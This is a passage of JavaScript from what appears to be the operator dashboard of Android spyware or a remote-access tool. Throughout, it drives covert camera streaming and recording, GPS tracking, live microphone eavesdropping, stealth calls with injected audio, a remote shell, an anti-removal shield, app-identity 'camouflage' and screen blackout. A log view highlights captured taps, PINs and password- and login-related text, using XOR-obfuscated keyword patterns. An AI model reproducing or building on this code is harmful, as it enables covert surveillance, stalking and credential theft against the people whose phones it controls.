        formattedText = formattedText.replace(/(\[CLICK\]:|\[LONG_CLICK\]:)/g, '<span style="color:var(--neon-green); font-weight:bold;">$1</span>');

        ["password", "pin", "code", "auth", "login", "account", "verify"].forEach(kw => {
          const re = new RegExp("(" + kw + ")", "gi");
          formattedText = formattedText.replace(re, '<span style="color:var(--neon-yellow); font-weight:bold; border-bottom:1px solid var(--neon-yellow);">$1</span>');
        });

        formattedText = formattedText.replace(/\b(\d{4,8})\b/g, '<span style="color:var(--danger); font-weight:bold; text-shadow: 0 0 8px var(--danger);">$1</span>');

        ["\\x1C\\x0D\\x03", "\\x13\\x18\\x00\\x12\\x13\\x01\\x10\\x0A", "\\x0F\\x06\\x14\\x00\\x0A", "\\x16\\x1A\\x16\\x13", "\\x06\\x04\\x02\\x08\\x08"].forEach(pattern => {
          const dec = pattern.split("").map((ch, idx) => String.fromCharCode(ch.charCodeAt(0) ^ "SysAdmin".charCodeAt(idx % 8))).join("");
          const re = new RegExp("(" + dec + ")", "gi");
          formattedText = formattedText.replace(re, '<span style="color:var(--danger); font-weight:bold; text-shadow: 0 0 10px rgba(255,49,49,0.5);">$1</span>');
        });

        n.innerHTML = formattedText;
        if (autoScroll) n.scrollTop = n.scrollHeight;
      }
    }
  } catch (err) {}
}

async function checkGhostStatus() {
  try {
    const res = await fetch("/ghost/status");
    if (res.ok) {
      const data = await res.json();
      _0x2b = data.isIdle;
      const statusCard = document.getElementById("ghost-status-card");
      const statusText = document.getElementById("ghost-status-text");
      const accPrompt = document.getElementById("accessibility-prompt");
      const lockBtn = document.getElementById("lock-btn");
      const antiRemovalBtn = document.getElementById("anti-removal-btn");
      const blackoutBtn = document.getElementById("blackout-btn");

      if (data.active) {
        if (statusCard) statusCard.style.borderColor = "var(--neon-green)";
        if (statusText) statusText.innerHTML = '<span style="color:var(--neon-green);">UPLINK_ESTABLISHED</span>';
        if (accPrompt) accPrompt.style.display = "none";
      } else {
        if (statusCard) statusCard.style.borderColor = "var(--danger)";
        if (statusText) statusText.innerHTML = '<span style="color:var(--danger);">OFFLINE_AWAITING_PERMISSION</span>';
        if (accPrompt) accPrompt.style.display = "block";
      }

      if (lockBtn) {
        if (data.lock) {
          lockBtn.innerHTML = "RELEASE_LOCK";
          lockBtn.style.borderColor = "var(--neon-green)";
          lockBtn.style.color = "var(--neon-green)";
        } else {
          lockBtn.innerHTML = "DEPLOY_LOCK";
          lockBtn.style.borderColor = "var(--danger)";
          lockBtn.style.color = "var(--danger)";
        }
      }

      if (blackoutBtn) {
        if (data.blackout) {
          blackoutBtn.innerHTML = "RESTORE_DISPLAY";
          blackoutBtn.style.borderColor = "var(--neon-cyan)";
          blackoutBtn.style.color = "var(--neon-cyan)";
          const feedback = document.getElementById("blackout-feedback");
          if (feedback) feedback.style.display = "block";
        } else {
          blackoutBtn.innerHTML = "ACTIVATE_BLACKOUT";
          blackoutBtn.style.borderColor = "#fff";
          blackoutBtn.style.color = "#fff";
          const feedback = document.getElementById("blackout-feedback");
          if (feedback) feedback.style.display = "none";
        }
      }

      const screenStream = document.getElementById("ghost-screen-stream");
      if (screenStream) {
        screenStream.style.filter = data.blackout ? "brightness(5.4) contrast(1.1)" : "none";
      }

      if (antiRemovalBtn) {
        if (data.antiRemoval) {
          antiRemovalBtn.innerHTML = "ANTI-REMOVAL SHIELD: ON";
          antiRemovalBtn.style.borderColor = "var(--neon-yellow)";
          antiRemovalBtn.style.color = "var(--neon-yellow)";
          antiRemovalBtn.style.background = "rgba(255, 255, 0, 0.15)";
        } else {
          antiRemovalBtn.innerHTML = "ANTI-REMOVAL SHIELD: OFF";
          antiRemovalBtn.style.borderColor = "var(--neon-yellow)";
          antiRemovalBtn.style.color = "var(--neon-yellow)";
          antiRemovalBtn.style.background = "rgba(255, 255, 0, 0.03)";
        }
      }
    }
  } catch (err) {}
}

// Camera Streaming Controls
function rotateStream() {
  _0x3b = (_0x3b + 90) % 360;
  const stream = document.getElementById("main-stream");
  if (stream) stream.style.transform = "rotate(" + _0x3b + "deg)";
}

function applyQuality(idx) {
  if (typeof resConfig !== 'undefined' && typeof resOptions !== 'undefined') {
    const cfg = resConfig[resOptions[idx]];
    _0x3d = cfg.w;
    _0x3e = cfg.h;
    _0x3f = cfg.q;
  }
  if (_0x3a) initiateStream(_0x3c);
}

async function initiateStream(camId) {
  _0x3c = camId;
  _0x3a = true;
  const loading = document.getElementById("loading-overlay");
  if (loading) {
    loading.style.display = "block";
    loading.innerText = "INITIALIZING_UPLINK...";
  }

  const liveIndicator = document.getElementById("live-indicator");
  const dot = document.getElementById("indicator-dot");
  const text = document.getElementById("indicator-text");

  if (liveIndicator) {
    liveIndicator.style.borderColor = "var(--neon-green)";
    liveIndicator.style.color = "var(--neon-green)";
    liveIndicator.style.background = "rgba(57, 255, 20, 0.15)";
  }
  if (dot) dot.className = "badge-dot blink-slow";
  if (text) text.innerText = "LIVE";

  document.querySelectorAll(".cam-btn").forEach(btn => {
    btn.classList.remove("btn-engaged-green");
    btn.style.borderColor = "var(--neon-green)";
    btn.style.color = "var(--neon-green)";
  });

  const currentCamBtn = document.getElementById("cam-btn-" + camId);
  if (currentCamBtn) {
    currentCamBtn.classList.add("btn-engaged-green");
    currentCamBtn.style.borderColor = "";
    currentCamBtn.style.color = "";
  }

  const mainStream = document.getElementById("main-stream");
  if (mainStream) {
    await fetch("/camera/stop-stream").catch(() => {});
    window.cameraStreamActive = true;
    _0x3a = true;

    const liveIndicator = document.getElementById("live-indicator");
    const dot = document.getElementById("indicator-dot");
    const text = document.getElementById("indicator-text");
    if (liveIndicator) {
      liveIndicator.style.borderColor = "var(--neon-green)";
      liveIndicator.style.color = "var(--neon-green)";
      liveIndicator.style.background = "rgba(57, 255, 20, 0.15)";
    }
    if (dot) dot.className = "badge-dot blink-slow";
    if (text) text.innerText = "LIVE";

    await fetch("/camera/start-stream?cam=" + camId + "&width=" + _0x3d + "&height=" + _0x3e + "&quality=" + _0x3f);

    function refreshCameraFeed() {
      if (window.cameraStreamActive) {
        const offscreenImg = new Image();
        offscreenImg.src = "/camera/frame?t=" + Date.now();
        offscreenImg.onload = () => {
          if (window.cameraStreamActive && mainStream) {
            mainStream.src = offscreenImg.src;
            mainStream.style.display = "block";
            if (loading) loading.style.display = "none";
            setTimeout(refreshCameraFeed, 20); // Silky smooth 20ms frame loop (15-25 FPS)
          }
        };
        offscreenImg.onerror = () => {
          if (window.cameraStreamActive) setTimeout(refreshCameraFeed, 150);
        };
      }
    }

    refreshCameraFeed();
  }
}

function terminateCaptures() {
  _0x3a = false;
  window.cameraStreamActive = false;
  fetch("/camera/stop-stream").catch(() => {});
  const mainStream = document.getElementById("main-stream");
  if (mainStream) {
    mainStream.src = "";
    mainStream.style.display = "none";
  }

  const loading = document.getElementById("loading-overlay");
  if (loading) {
    loading.style.display = "block";
    loading.innerText = "Uplink_Ready";
  }

  const liveIndicator = document.getElementById("live-indicator");
  const dot = document.getElementById("indicator-dot");
  const text = document.getElementById("indicator-text");

  if (liveIndicator) {
    liveIndicator.style.borderColor = "var(--neon-yellow)";
    liveIndicator.style.color = "var(--neon-yellow)";
    liveIndicator.style.background = "rgba(255, 255, 0, 0.05)";
  }
  if (dot) dot.className = "badge-dot";
  if (text) text.innerText = "STANDBY";

  document.querySelectorAll(".cam-btn").forEach(btn => {
    btn.classList.remove("btn-engaged-green");
    btn.style.borderColor = "var(--neon-green)";
    btn.style.color = "var(--neon-green)";
  });

  fetch("/camera/terminate").then(() => {
    const recBtn = document.getElementById("rec-btn");
    if (recBtn) recBtn.innerText = "START_RECORDING";
  });
}

function capturePhoto() {
  if (_0x3c) {
    window.open("/camera/photo?cam=" + _0x3c, "_blank");
  } else {
    showToast("SELECT_CAMERA_FIRST", "error");
  }
}

function toggleRecording() {
  const recBtn = document.getElementById("rec-btn");
  if (_0x3a) {
    if (recBtn && recBtn.innerText.includes("START")) {
      recBtn.innerText = "STOP_RECORDING";
      fetch("/camera/record?cam=" + _0x3c);
    } else {
      if (recBtn) recBtn.innerText = "START_RECORDING";
      fetch("/camera/stop-record");
    }
  } else {
    showToast("START_FEED_FIRST", "error");
  }
}

function checkRecStatus() {
  fetch("/camera/status")
    .then(res => res.json())
    .then(data => {
      const liveIndicator = document.getElementById("live-indicator");
      const dot = document.getElementById("indicator-dot");
      const text = document.getElementById("indicator-text");
      const recBtn = document.getElementById("rec-btn");

      if (data.last_finished) {
        if (null !== _lv && data.last_finished !== _lv) {
          showToast("DATA_SYNC: Auto-downloading recording...");
          const a = document.createElement("a");
          a.href = "/download/" + data.last_finished;
          a.download = "";
          document.body.appendChild(a);
          a.click();
          document.body.removeChild(a);
        }
        _lv = data.last_finished;
      }

      if (data.recording) {
        if (liveIndicator) {
          liveIndicator.style.borderColor = "var(--danger)";
          liveIndicator.style.color = "var(--danger)";
          liveIndicator.style.background = "rgba(255, 49, 49, 0.15)";
        }
        if (dot) dot.className = "badge-dot blink-fast";
        if (text) text.innerText = "REC (" + data.duration + "s)";
        if (recBtn) recBtn.innerText = "STOP_RECORDING";
      } else {
        if (_0x3a || window.cameraStreamActive || data.streaming) {
          if (liveIndicator) {
            liveIndicator.style.borderColor = "var(--neon-green)";
            liveIndicator.style.color = "var(--neon-green)";
            liveIndicator.style.background = "rgba(57, 255, 20, 0.15)";
          }
          if (dot) dot.className = "badge-dot blink-slow";
          if (text) text.innerText = "LIVE";
        } else {
          if (liveIndicator) {
            liveIndicator.style.borderColor = "var(--neon-yellow)";
            liveIndicator.style.color = "var(--neon-yellow)";
            liveIndicator.style.background = "rgba(255, 255, 0, 0.05)";
          }
          if (dot) dot.className = "badge-dot";
          if (text) text.innerText = "STANDBY";
        }
        if (recBtn) recBtn.innerText = "START_RECORDING";
      }
    });
}

// Information Popup Listener
document.addEventListener("click", function(e) {
  const popup = document.getElementById("info-popup");
  if (popup && "block" === popup.style.display && !popup.contains(e.target)) {
    hideInfo();
  }
});

// GPS Triangulation Controls
let currentLat = 0;
let currentLon = 0;

function _0x6a(msg) {
  const o = document.getElementById("gps-log");
  if (o) {
    const div = document.createElement("div");
    div.textContent = "[" + (new Date()).toLocaleTimeString() + "] " + msg;
    o.insertBefore(div, o.firstChild);
  }
}

function locateDevice() {
  _0x6a("[REQUEST] Pinging satellites...");
  fetch("/gps/locate?json=true")
    .then(res => res.json())
    .then(data => {
      if (data.success) {
        currentLat = data.lat;
        currentLon = data.lon;
        const display = document.getElementById("coord-display");
        if (display) display.innerHTML = "LAT: " + data.lat + " | LON: " + data.lon;
        _0x6a("[SUCCESS] Fix acquired: " + data.lat + ", " + data.lon);

        const mapFrame = document.getElementById("map-frame");
        const mapOverlay = document.getElementById("map-overlay");
        const extMapBtn = document.getElementById("ext-map-btn");

        if (mapFrame) {
          mapFrame.srcdoc = `<!DOCTYPE html><html><head><link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/><script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script><style>html,body,#map{height:100%;margin:0;padding:0;background:#000;}.leaflet-tile-pane{filter:invert(90%) hue-rotate(180deg);}.red-pin{background-color:#ff0033;width:16px;height:16px;border-radius:50%;border:2px solid #ffffff;box-shadow:0 0 12px #ff0033, 0 0 24px #ff0033;animation:pulse 1.5s infinite;margin-left:-8px;margin-top:-8px;}@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(255,0,51,0.8);}70%{box-shadow:0 0 0 15px rgba(255,0,51,0);}100%{box-shadow:0 0 0 0 rgba(255,0,51,0);}}</style></head><body><div id="map"></div><script>var m=L.map('map',{zoomControl:false}).setView([${data.lat},${data.lon}],15);L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(m);var redIcon=L.divIcon({className:'custom-red-pin',html:'<div class="red-pin"></div>'});L.marker([${data.lat},${data.lon}],{icon:redIcon}).addTo(m);</script></body></html>`;
          mapFrame.style.display = "block";
        }
        if (mapOverlay) mapOverlay.style.display = "none";
        if (extMapBtn) extMapBtn.style.display = "inline-block";
      } else {
        _0x6a("[ERROR] " + data.message);
        showToast(data.message);
      }
    })
    .catch(() => {
      _0x6a("[FATAL] Network error during triangulation");
    });
}

function openExternalMap() {
  window.open("https://www.google.com/maps/search/?api=1&query=" + currentLat + "," + currentLon, "_blank");
}

// File Filters
function filterFiles() {
  const searchVal = document.getElementById("file-search").value.toLowerCase();
  document.querySelectorAll(".file-item").forEach(item => {
    if (item.querySelector(".file-name").textContent.toLowerCase().includes(searchVal)) {
      item.style.display = "flex";
    } else {
      item.style.display = "none";
    }
  });
}

function setFilter(ext) {
  if ("all" === ext) {
    document.querySelectorAll(".file-item").forEach(item => item.style.display = "flex");
  } else {
    const list = ext.split(",");
    document.querySelectorAll(".file-item").forEach(item => {
      const name = item.querySelector(".file-name").textContent.toUpperCase();
      const match = list.some(suffix => name.endsWith(suffix));
      item.style.display = match ? "flex" : "none";
    });
  }
}

function clearIntel() {
  showToast("PURGING_INTEL_STREAM...");
  fetch("/intel/clear").then(() => location.reload());
}

function toggleStealth() {
  const val = document.getElementById("stealth-type").value;
  showToast("INITIATING_STEALTH_CAMOUFLAGE...");
  fetch("/stealth?type=" + val)
    .then(res => res.json())
    .then(data => {
      if (data.status) showToast("STEALTH_APPLIED: " + data.status);
    })
    .catch(err => {
      console.error(err);
      showToast("Stealth request failed", "error");
    });
}

// Robust Audio Bridge Logic with _ih cleanup
async function toggleLiveAudio() {
  const btn = document.getElementById('live-listen-btn');
  const player = document.getElementById('live-audio-player');
  if (audioStream) {
    fetch('/audio/speakerphone?enable=false').catch(() => {});
    if (_ih) {
      try { _ih.processor.disconnect(); } catch (e) {}
      try { _ih.source.disconnect(); } catch (e) {}
      try { if (_ih.context.state !== 'closed') _ih.context.close(); } catch (e) {}
      try { _ih.stream.getTracks().forEach(t => t.stop()); } catch (e) {}
      _ih = null;
    }
    audioStream.getTracks().forEach(t => t.stop());
    if (player) {
      player.pause();
      player.removeAttribute('src');
      player.load();
    }
    audioStream = null;
    _ac = false;
    if (btn) {
      btn.innerText = 'LISTEN_LIVE';
      btn.style.borderColor = 'var(--neon-cyan)';
      btn.style.color = 'var(--neon-cyan)';
      btn.style.background = 'transparent';
      btn.style.opacity = '1';
    }
  } else {
    if (btn) {
      btn.innerText = 'CONNECTING...';
      btn.style.opacity = '0.5';
    }
    if (player) {
      player.src = '/audio/stream?t=' + Date.now();
      player.play().then(() => {
        _ac = true;
        if (btn) {
          btn.innerText = 'STOP_LISTENING';
          btn.style.opacity = '1';
          btn.style.borderColor = 'var(--danger)';
          btn.style.color = 'var(--danger)';
          btn.style.background = 'rgba(255, 49, 49, 0.05)';
        } else {
          showToast("VIRTUAL_COMM: Audio bridge established");
        }
        audioStream = { getTracks: () => [{ stop: () => { player.pause(); player.removeAttribute('src'); player.load(); } }] };
      }).catch(e => {
        console.error(e);
        _ac = false;
        if (btn) {
          btn.innerText = 'LISTEN_LIVE';
          btn.style.opacity = '1';
        }
        showToast('Connection failed. Audio bypass may be active.', 'error');
      });
    }
  }
}

async function startStealthUplink() {
  if (_ih) {
    await toggleLiveAudio();
    return;
  }
  fetch('/audio/speakerphone?enable=true').catch(() => {});
  await toggleLiveAudio();
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    const audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000 });
    const source = audioCtx.createMediaStreamSource(stream);
    const processor = audioCtx.createScriptProcessor(4096, 1, 1);
    processor.onaudioprocess = (e) => {
      const inputData = e.inputBuffer.getChannelData(0);
      const pcmData = new Int16Array(inputData.length);
      for (let i = 0; i < inputData.length; i++) {
        pcmData[i] = Math.max(-32768, Math.min(32767, inputData[i] * 32768));
      }
      fetch('/audio/inject', {
        method: 'POST',
        body: pcmData.buffer,
        keepalive: true
      }).catch(err => console.error("Injection failed", err));
    };
    source.connect(processor);
    processor.connect(audioCtx.destination);
    _ih = { stream, context: audioCtx, processor, source };
    showToast("STEALTH_HANDSET: Bi-directional link active");
  } catch (e) {
    console.error("Uplink failed", e);
    showToast("MIC_ACCESS_DENIED", "error");
  }
}

// Consolidated Call Logic with Safe Input Handling (Null Checks)
async function initiateCellularCall(num) {
  if (!num) {
    const dialInput = document.getElementById("dial-number");
    num = dialInput ? dialInput.value : null;
  }
  if (!num) return showToast("ENTER_NUMBER_FIRST", "error");
  try {
    await fetch("/calls/make?number=" + encodeURIComponent(num) + "&json=true");
    showToast("CELLULAR_DIAL_DISPATCHED", "info");
  } catch (e) {
    console.error(e);
    showToast("CELLULAR_DISPATCH_FAILED", "error");
  }
}

async function startStealthCall(num) {
  if (!num) {
    const dialInput = document.getElementById("dial-number");
    num = dialInput ? dialInput.value : null;
  }
  if (!num) return showToast("ENTER_NUMBER_FIRST", "error");

  _0x4a("STEALTH_UPLINK", "Initializing secure cellular bridge...", async () => {
    showToast("INITIATING_CALL...");
    try {
      const response = await fetch("/calls/make?number=" + encodeURIComponent(num) + "&stealth=true&json=true");
      showToast("UPLINK_COMMAND_SENT", "info");
      if (response.ok) {
        showToast("WAITING_FOR_OS_HANDSHAKE...");
        showToast("SYNCHRONIZING_COMM_STREAMS...", "info");
        await new Promise(r => setTimeout(r, 3500));
        await startStealthUplink();
      }
    } catch (e) {
      console.error(e);
      showToast("STEALTH_CALL_FAILED", "error");
    }
  });
}

async function startVirtualCall() {
  _0x4a("AMBIENT_UPLINK", "Establishing secure audio bridge...", async () => {
    try {
      await fetch("/calls/voip?type=ambient");
      showToast("VIRTUAL_UPLINK_INITIATED", "info");
      await toggleLiveAudio();
    } catch (e) {
      console.error(e);
      showToast("VIRTUAL_UPLINK_FAILED", "error");
    }
  });
}

function restoreNormal() {
  showToast("RESTORING_ORIGINAL_IDENTITY...");
  fetch("/stealth?action=restore")
    .then(res => res.json())
    .then(data => {
      if (data.status) showToast("IDENTITY_RESTORED");
    })
    .catch(err => {
      console.error(err);
      showToast("Restore request failed", "error");
    });
}

// Window Event Mapping & Initialization
window.alert = e => showToast(e);
window.onpopstate = updateNav;
window.addEventListener("pageshow", updateNav);
document.addEventListener("visibilitychange", () => {
  if ("visible" === document.visibilityState) updateNav();
});

document.addEventListener("DOMContentLoaded", () => {
  updateNav();
  let camScroll = localStorage.getItem("cam_scroll");
  if (camScroll) {
    window.scrollTo(0, parseInt(camScroll));
    localStorage.removeItem("cam_scroll");
  }

  if (document.getElementById("log-terminal")) {
    fetchLogs();
    setInterval(fetchLogs, 5000);
  }

  if (document.getElementById("ghost-status-card")) {
    checkGhostStatus();
    refreshGhostLogs();
    setInterval(checkGhostStatus, 2000);
    setInterval(refreshGhostLogs, 2000);
  }

  if (document.getElementById("live-indicator")) {
    setInterval(checkRecStatus, 2000);
    let opticsScroll = localStorage.getItem("optics_scroll");
    if (opticsScroll) {
      window.scrollTo(0, parseInt(opticsScroll));
      localStorage.removeItem("optics_scroll");
    }
  }

  if (document.getElementById("duration")) {
    setInterval(() => {
      fetch("/audio/status")
        .then(res => res.json())
        .then(data => {
          const durationElement = document.getElementById("duration");
          if (data.isRecording && durationElement) {
            const sec = data.duration;
            const min = Math.floor(sec / 60);
            const remainingSec = sec % 60;
            durationElement.textContent = min + ":" + (remainingSec < 10 ? "0" : "") + remainingSec;
          }
          if (data.callInProgress && !document.querySelector(".call-alert")) {
            location.reload();
          }
        });
    }, 2000);
  }

  const shellCmdInput = document.getElementById("shell-cmd");
  if (shellCmdInput) {
    shellCmdInput.addEventListener("keydown", function(event) {
      if ("ArrowUp" === event.key) {
        event.preventDefault();
        if (_0x1c < _0x1b.length - 1) {
          _0x1c++;
          this.value = _0x1b[_0x1b.length - 1 - _0x1c];
        }
      } else if ("ArrowDown" === event.key) {
        event.preventDefault();
        if (_0x1c > 0) {
          _0x1c--;
          this.value = _0x1b[_0x1b.length - 1 - _0x1c];
        } else if (0 === _0x1c) {
          _0x1c = -1;
          this.value = "";
        }
      } else if ("Enter" === event.key) {
        executeShell();
      }
    });
  }

  const loginForm = document.getElementById("login-form");
  if (loginForm) loginForm.addEventListener("submit", handleLogin);

  const passwordForm = document.querySelector('form[action="/settings/password"]');
  if (passwordForm) passwordForm.addEventListener("submit", updatePassword);

  document.addEventListener("click", () => {
    const palette = document.getElementById("color-picker-palette");
    if (palette && "grid" === palette.style.display) {
      palette.style.display = "none";
    }
  });
});
